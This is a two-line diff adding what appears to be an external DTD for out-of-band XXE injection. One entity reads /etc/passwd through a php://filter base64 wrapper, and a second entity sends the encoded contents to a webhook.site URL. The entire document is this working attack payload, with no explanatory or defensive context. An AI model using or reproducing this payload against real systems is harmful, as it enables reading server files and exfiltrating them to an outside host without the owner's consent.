@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'https://webhook.site/8382bed2-e117-4979-9173-6a4e13452bd2/?content=%file;'>">
